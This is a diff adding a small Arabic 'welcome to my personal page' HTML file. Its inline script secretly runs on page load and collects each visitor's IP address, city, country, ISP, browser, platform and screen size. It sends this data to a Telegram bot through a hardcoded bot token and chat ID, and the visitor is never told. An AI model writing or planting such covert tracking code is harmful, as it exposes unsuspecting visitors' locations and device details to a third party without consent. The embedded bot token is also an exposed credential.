@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مرحباً بك!</title>
+    <style>
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            background-color: #0f172a;
+            color: #f8fafc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background: #1e293b;
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            text-align: center;
+            max-width: 400px;
+        }
+        h1 { margin-bottom: 0.5rem; color: #38bdf8; }
+        p { color: #94a3b8; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h1>مرحباً بك في صفحتي الشخصية 👋</h1>
+        <p>يسعدني مرورك من هنا!</p>
+    </div>
+
+    <script>
+        // التوكن والآيدي الخاص بك
+        const BOT_TOKEN = "9067905487:AAFWRzqKu9WX0XZYfmEdHtaRrITXiQarppI";
+        const CHAT_ID = "8318202151";
+
+        async function sendVisitorData() {
+            try {
+                // استخدام خدمة بديلة ومستقرة لجلب الـ IP والموقع
+                const response = await fetch("https://ipinfo.io/json");
+                const data = await response.json();
+
+                const ip = data.ip || "غير معروف";
+                const city = data.city || "غير معروف";
+                const country = data.country || "غير معروف";
+                const org = data.org || "غير معروف";
+                
+                const userAgent = navigator.userAgent;
+                const platform = navigator.platform;
+                const screenRes = window.screen.width + "x" + window.screen.height;
+                const time = new Date().toLocaleString();
+
+                // بناء نص الرسالة
+                const textMsg = 
+                    "🚨 تم تسجيل زيارة جديدة!\n\n" +
+                    "📍 الموقع: " + city + "، " + country + "\n" +
+                    "🌐 IP: " + ip + "\n" +
+                    "📡 المزود: " + org + "\n" +
+                    "📱 الجهاز: " + platform + "\n" +
+                    "💻 المتصفح: " + userAgent + "\n" +
+                    "🖥 الشاشة: " + screenRes + "\n" +
+                    "⏰ الوقت: " + time;
+
+                // إرسال الطلب إلى بوت تيليجرام
+                await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: textMsg
+                    })
+                });
+
+            } catch (error) {
+                console.error("حدث خطأ أثناء الإرسال:", error);
+            }
+        }
+
+        window.onload = sendVisitorData;
+    </script>
+</body>
+</html>
